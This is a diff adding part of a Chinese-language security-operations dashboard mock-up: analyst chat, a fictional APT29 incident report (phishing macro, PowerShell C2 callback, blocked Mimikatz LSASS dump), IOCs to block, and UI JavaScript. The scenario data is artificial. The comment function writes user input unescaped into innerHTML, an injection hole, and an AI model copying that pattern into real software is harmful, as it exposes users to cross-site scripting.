+          <div class="text-[11px] p-2 rounded bg-slate-900 border border-slate-800/80">
+            <div class="flex items-center justify-between mb-1">
+              <strong class="text-cyan-400 font-medium">Alex Zhao</strong>
+              <span class="text-[10px] text-slate-500 font-mono">11:22:04</span>
+            </div>
+            <p class="text-slate-300 leading-relaxed">
+              <span class="text-blue-400 font-semibold">@Chen.Wei</span> 内存转储镜像已上传至物证库，请优先抓取 lsass 进程注入段是否有残留明文凭据。
+            </p>
+          </div>
+
+          <div class="text-[11px] p-2 rounded bg-slate-900 border border-slate-800/80">
+            <div class="flex items-center justify-between mb-1">
+              <strong class="text-emerald-400 font-medium">Chen Wei</strong>
+              <span class="text-[10px] text-slate-500 font-mono">11:35:10</span>
+            </div>
+            <p class="text-slate-300 leading-relaxed">
+              已对内存 Dump 完成 Volatility 扫描。lsass 访问句柄在注入第一时刻即被 EDR 阻断，未发现抓取成功的 Kerberos 票据，确认内网凭据安全。
+            </p>
+          </div>
+        </div>
+
+        <!-- 评论发送框 -->
+        <div class="p-2.5 border-t border-slate-800 bg-[#0A0F1A]">
+          <div class="relative">
+            <textarea id="commentInput" placeholder="输入处置笔记、@提及专家、或指令说明..." rows="2" class="w-full bg-slate-900 border border-slate-800 rounded-md p-2 text-xs text-slate-200 placeholder-slate-500 focus:outline-none focus:border-cyan-500 resize-none font-sans"></textarea>
+            <div class="flex items-center justify-between mt-1">
+              <div class="flex items-center space-x-1.5 text-slate-400 text-xs">
+                <button class="hover:text-cyan-400" title="提及成员">@</button>
+                <button class="hover:text-cyan-400" title="插入IOC">#</button>
+                <button class="hover:text-cyan-400" title="上传附件">📎</button>
+              </div>
+              <button onclick="postComment()" class="px-3 py-1 rounded bg-blue-600 hover:bg-blue-500 text-white text-xs font-medium font-mono transition-colors">
+                发布笔记
+              </button>
+            </div>
+          </div>
+        </div>
+      </div>
+    </aside>
+  </div>
+
+  <!-- ==================== 3. 模态抽屉与弹窗组件 ==================== -->
+
+  <!-- SBAR 事故调查报告预览抽屉/弹窗 -->
+  <div id="sbarModal" class="fixed inset-0 bg-black/80 backdrop-blur-sm z-50 hidden flex items-center justify-center p-4">
+    <div class="bg-[#0D1424] border border-slate-700/80 w-full max-w-4xl max-h-[90vh] rounded-xl shadow-2xl flex flex-col overflow-hidden animate-in fade-in zoom-in-95 duration-200">
+      <!-- 报告头部 -->
+      <div class="p-4 bg-gradient-to-r from-[#111C33] to-[#0D1424] border-b border-slate-800 flex items-center justify-between">
+        <div class="flex items-center space-x-3">
+          <div class="w-8 h-8 rounded-lg bg-blue-600 flex items-center justify-center text-white font-bold">
+            S
+          </div>
+          <div>
+            <h3 class="text-sm font-bold text-white tracking-wide">SBAR 标准网络安全事故调查结单报告</h3>
+            <span class="text-xs font-mono text-cyan-400">INCIDENT-SBAR-20260930-0418 · CLASSIFICATION: CONFIDENTIAL</span>
+          </div>
+        </div>
+        <div class="flex items-center space-x-2">
+          <button onclick="window.print()" class="px-2.5 py-1 rounded bg-slate-800 text-slate-300 hover:text-white border border-slate-700 text-xs font-mono">
+            打印 / 另存为 PDF
+          </button>
+          <button onclick="closeSbarModal()" class="p-1 rounded text-slate-400 hover:text-white">
+            <svg class="w-5 h-5" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
+          </button>
+        </div>
+      </div>
+
+      <!-- 报告主体内容 (SBAR 标准模型) -->
+      <div class="p-6 overflow-y-auto space-y-5 text-xs text-slate-300 leading-relaxed font-sans">
+        <!-- 基础元数据 -->
+        <div class="grid grid-cols-4 gap-3 p-3 bg-slate-950/70 rounded-lg border border-slate-800/80 font-mono text-[11px]">
+          <div><span class="text-slate-400">威胁定级:</span> <strong class="text-red-400">P1 致命威胁 (Critical)</strong></div>
+          <div><span class="text-slate-400">威胁行为体:</span> <strong class="text-cyan-400">APT29 (Cozy Bear)</strong></div>
+          <div><span class="text-slate-400">首发响应用时:</span> <strong class="text-emerald-400">1.8 分钟 (MTTA)</strong></div>
+          <div><span class="text-slate-400">遏制完成用时:</span> <strong class="text-emerald-400">8.2 分钟 (MTTC)</strong></div>
+        </div>
+
+        <!-- S (Situation 现状) -->
+        <div class="p-4 rounded-lg bg-slate-900/60 border border-slate-800">
+          <h4 class="text-sm font-bold text-cyan-300 mb-2 flex items-center gap-2">
+            <span class="w-5 h-5 rounded bg-cyan-950 border border-cyan-800 flex items-center justify-center font-mono text-xs">S</span>
+            现状概述 (Situation)
+          </h4>
+          <p class="text-slate-300">
+            2026年9月30日 10:15:20 CST，财务部员工终端 <code class="text-amber-300 font-mono">host-fin-04</code> 触发疑似 APT29 供应链钓鱼邮件宏反弹木马事件。10:35 恶意进程尝试调用底层 API 转储 LSASS 内存凭证，被 SentinelOne EDR 探针拦截。SOC 剧本于 10:48 自动完成受害者网络切断并向核心防火墙推送 C2 IP 阻断，当前攻击链已被阻断于初始终端。
+          </p>
+        </div>
+
+        <!-- B (Background 背景与溯源) -->
+        <div class="p-4 rounded-lg bg-slate-900/60 border border-slate-800">
+          <h4 class="text-sm font-bold text-blue-300 mb-2 flex items-center gap-2">
+            <span class="w-5 h-5 rounded bg-blue-950 border border-blue-800 flex items-center justify-center font-mono text-xs">B</span>
+            攻击背景与链路因果 (Background)
+          </h4>
+          <p class="text-slate-300 mb-2">
+            本次攻击采用高度定向钓鱼战术（T1566.001），攻击者伪造了长期合作供应商的对账发票（invoice_update.xlsm）。宏代码利用无文件内存技术唤醒 PowerShell 反弹下载 <code class="text-cyan-300 font-mono">update_sync.dll</code>，并向荷兰机房 C2 (<code class="text-red-400 font-mono">185.220.101.45</code>) 建立加密回连通道。
+          </p>
+          <ul class="list-disc list-inside space-y-1 text-slate-400 font-mono text-[11px]">
+            <li>10:15:20 - 钓鱼邮件附件投递并打开 (T1566.001)</li>
+            <li>10:22:15 - PowerShell 隐蔽拉起与 C2 外联 (T1059.001)</li>
+            <li>10:35:40 - Mimikatz 尝试注入 lsass.exe (T1003.001)</li>
+            <li>10:48:00 - SOAR 自动遏制隔离 host-fin-04</li>
+          </ul>
+        </div>
+
+        <!-- A (Assessment 评估) -->
+        <div class="p-4 rounded-lg bg-slate-900/60 border border-slate-800">
+          <h4 class="text-sm font-bold text-amber-300 mb-2 flex items-center gap-2">
+            <span class="w-5 h-5 rounded bg-amber-950 border border-amber-800 flex items-center justify-center font-mono text-xs">A</span>
+            技术研判与损害评估 (Assessment)
+          </h4>
+          <div class="grid grid-cols-2 gap-3 text-slate-300">
+            <div class="p-2.5 rounded bg-slate-950 border border-slate-800">
+              <span class="text-emerald-400 font-bold block mb-1">✔ 凭据与域安全确认未失陷:</span>
+              经过对抽取出的 2.4GB 内存 Dump 进行取证，LSASS 在句柄打开阶段即被切断，未泄露域控 Kerberos 凭证，内网未发生横向越权。
+            </div>
+            <div class="p-2.5 rounded bg-slate-950 border border-slate-800">
+              <span class="text-emerald-400 font-bold block mb-1">✔ 数据无外泄痕迹:</span>
+              网络流量分析确认，外联持续时间仅为 42 秒，传输包大小为 890KB（仅包含二阶段下载），无核心财务数据库数据被压缩外发。
+            </div>
+          </div>
+        </div>
+
+        <!-- R (Recommendation 处置建议) -->
+        <div class="p-4 rounded-lg bg-slate-900/60 border border-slate-800">
+          <h4 class="text-sm font-bold text-emerald-300 mb-2 flex items-center gap-2">
+            <span class="w-5 h-5 rounded bg-emerald-950 border border-emerald-800 flex items-center justify-center font-mono text-xs">R</span>
+            整改建议与加固动作 (Recommendation)
+          </h4>
+          <ol class="list-decimal list-inside space-y-1.5 text-slate-300">
+            <li>强制重置涉案域账号 <code class="text-amber-300 font-mono">CORP\lisa.m</code> 密码并吊销所有活跃 OAuth / Kerberos 凭证令牌；</li>
+            <li>向全网端点下发组策略，在办公网全面禁用 Office 未签名 VBA 宏执行功能；</li>
+            <li>将提取的 12 项 APT29 IOC（包括 IP 185.220.101.45、域名 api-sync-cdn.org）加入全网防火墙与 DNS 长期封禁黑名单；</li>
+            <li>对 host-fin-04 实施系统全盘抹除重装与镜像备份取证留存。</li>
+          </ol>
+        </div>
+      </div>
+
+      <!-- 报告底部动作 -->
+      <div class="p-4 bg-slate-950 border-t border-slate-800 flex items-center justify-between">
+        <span class="text-xs text-slate-400 font-mono">签署人: Alex Zhao (SOC 应急响应主管) · 2026-09-30 11:40</span>
+        <div class="flex items-center space-x-2">
+          <button onclick="showToast('已生成加密防篡改报告签名并归档入库', 'success'); closeSbarModal();" class="px-4 py-2 rounded-lg bg-emerald-600 hover:bg-emerald-500 text-white text-xs font-semibold">
+            批准结单并归档
+          </button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Cmd + K 全局控制台弹窗 -->
+  <div id="cmdPaletteModal" class="fixed inset-0 bg-black/75 backdrop-blur-sm z-50 hidden flex items-start justify-center pt-24 p-4">
+    <div class="bg-[#0F172A] border border-slate-700 w-full max-w-lg rounded-xl shadow-2xl overflow-hidden animate-in fade-in zoom-in-95 duration-150">
+      <div class="p-3 border-b border-slate-800 flex items-center space-x-2">
+        <svg class="w-4 h-4 text-cyan-400" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.3-4.3"/></svg>
+        <input type="text" id="cmdInput" placeholder="输入研判指令、查询 IOC、切换案件或剧本 (Esc 关闭)..." class="w-full bg-transparent text-sm text-slate-200 placeholder-slate-500 focus:outline-none font-mono">
+      </div>
+      <div class="p-2 max-h-64 overflow-y-auto space-y-1 text-xs font-mono">
+        <div onclick="selectCase('0418'); toggleCommandPalette();" class="p-2 rounded hover:bg-slate-800 cursor-pointer flex items-center justify-between">
+          <span class="text-cyan-300">切换至案件: CASE-20260930-0418 (APT29)</span>
+          <span class="text-[10px] text-red-400">P1 致命</span>
+        </div>
+        <div onclick="toggleHostIsolation(); toggleCommandPalette();" class="p-2 rounded hover:bg-slate-800 cursor-pointer flex items-center justify-between">
+          <span class="text-slate-200">执行指令: 切换 host-fin-04 网络隔离状态</span>
+          <span class="text-[10px] text-cyan-400">SOAR</span>
+        </div>
+        <div onclick="openSbarModal(); toggleCommandPalette();" class="p-2 rounded hover:bg-slate-800 cursor-pointer flex items-center justify-between">
+          <span class="text-slate-200">打开 SBAR 结单事故调查报告</span>
+          <span class="text-[10px] text-purple-400">Report</span>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- 全局 Toast 提示容器 -->
+  <div id="toastContainer" class="fixed bottom-5 right-5 z-50 flex flex-col space-y-2 pointer-events-none"></div>
+
+  <!-- ==================== 4. 业务逻辑与交互脚本 ==================== -->
+  <script>
+    // 1. Toast 状态通知管理器
+    function showToast(message, type = 'info') {
+      const container = document.getElementById('toastContainer');
+      const toast = document.createElement('div');
+      toast.className = `px-4 py-2.5 rounded-lg shadow-xl text-xs font-mono border pointer-events-auto flex items-center space-x-2 transition-all transform duration-300 translate-y-2 opacity-0 ${
+        type === 'success' ? 'bg-emerald-950/90 text-emerald-300 border-emerald-700/80 shadow-emerald-950/50' :
+        type === 'error' ? 'bg-red-950/90 text-red-300 border-red-700/80 shadow-red-950/50' :
+        'bg-slate-900/90 text-cyan-300 border-cyan-700/80 shadow-cyan-950/50'
+      }`;
+      toast.innerHTML = `
+        <span class="w-2 h-2 rounded-full ${type === 'success' ? 'bg-emerald-400' : type === 'error' ? 'bg-red-400' : 'bg-cyan-400'} animate-ping"></span>
+        <span>${message}</span>
+      `;
+      container.appendChild(toast);
+      
+      // 显示动效
+      requestAnimationFrame(() => {
+        toast.classList.remove('translate-y-2', 'opacity-0');
+      });
+
+      // 3.5秒后渐隐移除
+      setTimeout(() => {
+        toast.classList.add('opacity-0', 'translate-y-2');
+        setTimeout(() => toast.remove(), 300);
+      }, 3500);
+    }
+
+    // 2. 时间线展开收起原始日志
+    function toggleDetails(elementId) {
+      const el = document.getElementById(elementId);
+      if (el) {
+        el.classList.toggle('hidden');
+      }
+    }
+
+    // 3. 复制代码片段
+    function copyCode(btn, codeId) {
+      const codeEl = document.getElementById(codeId);
+      if (codeEl) {
+        navigator.clipboard.writeText(codeEl.innerText).then(() => {
+          const original = btn.innerText;
+          btn.innerText = '已复制！';
+          setTimeout(() => btn.innerText = original, 2000);
+        });
+      }
+    }
+
+    // 4. 推进处置生命周期阶段
+    let currentStage = 2;
+    function advanceStage() {
+      if (currentStage === 2) {
+        currentStage = 3;
+        const node2 = document.getElementById('step-node-2');
+        const node3 = document.getElementById('step-node-3');
+        const currentStageText = document.getElementById('currentStageText');
+        const advanceBtn = document.getElementById('advanceBtn');
+
+        // 阶段 2 标记完成
+        node2.className = 'flex items-center space-x-2 p-2 rounded-md bg-emerald-950/30 border border-emerald-800/50';
+        node2.innerHTML = `
+          <div class="w-5 h-5 rounded-full bg-emerald-500/20 text-emerald-400 flex items-center justify-center font-mono text-[10px] font-bold border border-emerald-500/40">✓</div>
+          <div class="flex flex-col min-w-0">
+            <span class="text-[11px] font-semibold text-emerald-300 truncate">2. 深入调查</span>
+            <span class="text-[9px] text-emerald-500/80 font-mono">取证分析完成</span>
+          </div>
+        `;
+
+        // 阶段 3 激活
+        node3.className = 'flex items-center space-x-2 p-2 rounded-md bg-red-950/50 border-2 border-red-500 shadow-md shadow-red-900/30';
+        node3.innerHTML = `
+          <div class="w-5 h-5 rounded-full bg-red-500 text-white flex items-center justify-center font-mono text-[10px] font-bold animate-pulse">3</div>
+          <div class="flex flex-col min-w-0">
+            <span class="text-[11px] font-bold text-red-200 truncate">3. 威胁遏制 (进行中)</span>
+            <span class="text-[9px] text-red-400 font-mono">隔离策略验证中</span>
+          </div>
+        `;
+
+        currentStageText.className = 'text-red-400 font-bold';
+        currentStageText.innerText = '3. 威胁遏制 (Containment)';
+        advanceBtn.innerHTML = '<span>推进至「根除恢复」阶段</span><svg class="w-3 h-3" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="m9 18 6-6-6-6"/></svg>';
+
+        showToast('工单已推进至【威胁遏制】阶段，主链路策略锁定！', 'success');
+      } else if (currentStage === 3) {
+        currentStage = 4;
+        const node3 = document.getElementById('step-node-3');
+        const node4 = document.getElementById('step-node-4');
+        const currentStageText = document.getElementById('currentStageText');
+        const advanceBtn = document.getElementById('advanceBtn');
+
+        node3.className = 'flex items-center space-x-2 p-2 rounded-md bg-emerald-950/30 border border-emerald-800/50';
+        node3.innerHTML = `
+          <div class="w-5 h-5 rounded-full bg-emerald-500/20 text-emerald-400 flex items-center justify-center font-mono text-[10px] font-bold border border-emerald-500/40">✓</div>
+          <div class="flex flex-col min-w-0">
+            <span class="text-[11px] font-semibold text-emerald-300 truncate">3. 威胁遏制</span>
+            <span class="text-[9px] text-emerald-500/80 font-mono">阻断生效</span>
+          </div>
+        `;
+
+        node4.className = 'flex items-center space-x-2 p-2 rounded-md bg-blue-950/50 border-2 border-cyan-400 shadow-md shadow-cyan-900/30';
+        node4.innerHTML = `
+          <div class="w-5 h-5 rounded-full bg-cyan-500 text-slate-900 flex items-center justify-center font-mono text-[10px] font-bold animate-pulse">4</div>
+          <div class="flex flex-col min-w-0">
+            <span class="text-[11px] font-bold text-cyan-200 truncate">4. 根除恢复</span>
+            <span class="text-[9px] text-cyan-400 font-mono">补丁加固与策略重放</span>
+          </div>
+        `;
+
+        currentStageText.className = 'text-cyan-400 font-bold';
+        currentStageText.innerText = '4. 根除恢复 (Remediation)';
+        advanceBtn.innerHTML = '<span>准备复盘结单</span><svg class="w-3 h-3" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="m9 18 6-6-6-6"/></svg>';
+
+        showToast('威胁遏制已确认，已进入【根除恢复】阶段！', 'success');
+      } else {
+        openSbarModal();
+      }
+    }
+
+    // 5. 主机网络隔离开关
+    let isIsolated = true;
+    function toggleHostIsolation() {
+      const text = document.getElementById('hostIsolationStatusText');
+      const btn = document.getElementById('isolateBtn');
+      if (isIsolated) {
+        isIsolated = false;
+        text.className = 'text-[10px] text-amber-400 font-mono';
+        text.innerText = 'host-fin-04 已接入网络';
+        btn.className = 'px-2.5 py-1 rounded text-xs font-mono font-medium bg-red-600 hover:bg-red-500 text-white transition-all';
+        btn.innerText = '下发隔离';
+        showToast('已解除主机隔离限制，端点恢复全网通信', 'error');
+      } else {
+        isIsolated = true;
+        text.className = 'text-[10px] text-emerald-400 font-mono';
+        text.innerText = 'host-fin-04 已被强制隔离';
+        btn.className = 'px-2.5 py-1 rounded text-xs font-mono font-medium bg-red-600/30 hover:bg-red-600 text-red-300 hover:text-white border border-red-500/50 transition-all';
+        btn.innerText = '解除隔离';
+        showToast('EDR 指令已生效：host-fin-04 处于网络隔离区', 'success');
+      }
+    }
+
+    // 6. 重置涉案域账户
+    function resetAdAccount() {
+      const btn = document.getElementById('resetAccountBtn');
+      btn.disabled = true;
+      btn.innerText = '正在重置...';
+      setTimeout(() => {
+        btn.innerText = '已重置成功';
+        btn.className = 'px-2.5 py-1 rounded text-xs font-mono font-medium bg-emerald-600/20 text-emerald-400 border border-emerald-500/40';
+        showToast('已通过 LDAP 联动强制锁定并重置 CORP\\lisa.m 密码', 'success');
+      }, 800);
+    }
+
+    // 7. 触发全量深度复查剧本
+    function runDeepTriage() {
+      showToast('SOAR 剧本 PB-DEEP-AUDIT-v2 已下发，扫描内网横向跳板中...', 'info');
+      setTimeout(() => {
+        showToast('深度复查完成：域控 dc-corp-01 及核心账密资产未发现攻击残留！', 'success');
+      }, 1600);
+    }
+
+    // 8. 物证区 Tab 切换
+    function switchEvidenceTab(tab) {
+      document.getElementById('evidence-files-view').classList.add('hidden');
+      document.getElementById('evidence-iocs-view').classList.add('hidden');
+      document.getElementById('evidence-tree-view').classList.add('hidden');
+
+      document.getElementById('tab-btn-files').className = 'px-3 py-1 rounded-md text-slate-400 hover:text-slate-200';
+      document.getElementById('tab-btn-iocs').className = 'px-3 py-1 rounded-md text-slate-400 hover:text-slate-200';
+      document.getElementById('tab-btn-tree').className = 'px-3 py-1 rounded-md text-slate-400 hover:text-slate-200';
+
+      if (tab === 'files') {
+        document.getElementById('evidence-files-view').classList.remove('hidden');
+        document.getElementById('tab-btn-files').className = 'px-3 py-1 rounded-md bg-blue-600 text-white font-medium';
+      } else if (tab === 'iocs') {
+        document.getElementById('evidence-iocs-view').classList.remove('hidden');
+        document.getElementById('tab-btn-iocs').className = 'px-3 py-1 rounded-md bg-blue-600 text-white font-medium';
+      } else if (tab === 'tree') {
+        document.getElementById('evidence-tree-view').classList.remove('hidden');
+        document.getElementById('tab-btn-tree').className = 'px-3 py-1 rounded-md bg-blue-600 text-white font-medium';
+      }
+    }
+
+    // 9. 时间线类型过滤
+    function filterTimeline(category) {
+      const items = document.querySelectorAll('.timeline-item');
+      items.forEach(item => {
+        if (category === 'all' || item.getAttribute('data-category') === category) {
+          item.classList.remove('hidden');
+        } else {
+          item.classList.add('hidden');
+        }
+      });
+
+      const buttons = ['all', 'network', 'endpoint', 'soar', 'human'];
+      buttons.forEach(btn => {
+        const el = document.getElementById(`filter-${btn}`);
+        if (btn === category) {
+          el.className = 'px-2 py-1 rounded bg-blue-600 text-white font-medium';
+        } else {
+          el.className = 'px-2 py-1 rounded bg-slate-900 text-slate-400 hover:text-slate-200 border border-slate-800';
+        }
+      });
+    }
+
+    // 10. 左侧工单卡片高亮切换
+    function selectCase(caseId) {
+      document.querySelectorAll('#caseListContainer > div').forEach(card => {
+        card.classList.remove('border-cyan-500/80', 'bg-[#141F36]', 'border-2');
+        card.classList.add('border-slate-800', 'bg-[#0F172A]');
+      });
+      const activeCard = document.getElementById(`case-card-${caseId}`);
+      if (activeCard) {
+        activeCard.classList.remove('border-slate-800', 'bg-[#0F172A]');
+        activeCard.classList.add('border-cyan-500/80', 'bg-[#141F36]', 'border-2');
+        showToast(`已切换当前研判工单视图至: CASE-20260930-${caseId}`, 'info');
+      }
+    }
+
+    // 11. 提交协同讨论笔记
+    function postComment() {
+      const input = document.getElementById('commentInput');
+      const text = input.value.trim();
+      if (!text) return;
+
+      const container = document.getElementById('commentsContainer');
+      const now = new Date();
+      const timeStr = `${String(now.getHours()).padStart(2, '0')}:${String(now.getMinutes()).padStart(2, '0')}:${String(now.getSeconds()).padStart(2, '0')}`;
+
+      const commentEl = document.createElement('div');
+      commentEl.className = 'text-[11px] p-2 rounded bg-slate-900 border border-cyan-800/60 animate-in fade-in slide-in-from-bottom-2 duration-200';
+      commentEl.innerHTML = `
+        <div class="flex items-center justify-between mb-1">
+          <strong class="text-cyan-300 font-medium">Alex Zhao (L3)</strong>
+          <span class="text-[10px] text-slate-500 font-mono">${timeStr}</span>
+        </div>
+        <p class="text-slate-200 leading-relaxed">${text}</p>
+      `;
+      container.appendChild(commentEl);
+      input.value = '';
+      container.scrollTop = container.scrollHeight;
+      showToast('已同步研判笔记至案件日志与工单交接流', 'success');
+    }
+
+    // 快捷键 Cmd+Enter 发布笔记
+    document.getElementById('commentInput').addEventListener('keydown', (e) => {
+      if ((e.metaKey || e.ctrlKey) && e.key === 'Enter') {
+        postComment();
+      }
+    });
+
+    // 12. SBAR 报告弹窗控制
+    function openSbarModal() {
+      document.getElementById('sbarModal').classList.remove('hidden');
+    }
+    function closeSbarModal() {
+      document.getElementById('sbarModal').classList.add('hidden');
+    }
+
+    // 13. Cmd+K 控制台弹窗
+    function toggleCommandPalette() {
+      const modal = document.getElementById('cmdPaletteModal');
+      modal.classList.toggle('hidden');
+      if (!modal.classList.contains('hidden')) {
+        document.getElementById('cmdInput').focus();
+      }
+    }
+
+    // 全局快捷键监听 Cmd+K & Esc
+    window.addEventListener('keydown', (e) => {
+      if ((e.metaKey || e.ctrlKey) && e.key === 'k') {
+        e.preventDefault();
+        toggleCommandPalette();
+      }
+      if (e.key === 'Escape') {
+        closeSbarModal();
+        document.getElementById('cmdPaletteModal').classList.add('hidden');
+      }
+    });
+
+    // 跑马灯动态遥测文案轮播
+    const tickers = [
+      '[10:48:00] host-fin-04 EDR 隔离生效 · 阻断 C2: 185.220.101.45',
+      '[11:02:15] Palo Alto 防火墙已同步全网动态封禁名单 (Dynamic Blocklist)',
+      '[11:20:44] 内存 Dump 样本 host-fin-04-memdump.raw 取证校验码匹配'
+    ];
+    let tickerIdx = 0;
+    setInterval(() => {
+      tickerIdx = (tickerIdx + 1) % tickers.length;
+      const el = document.getElementById('telemetryTicker');
+      if (el) {
+        el.innerText = tickers[tickerIdx];
+      }
+    }, 4500);
+  </script>
+</body>
+</html>
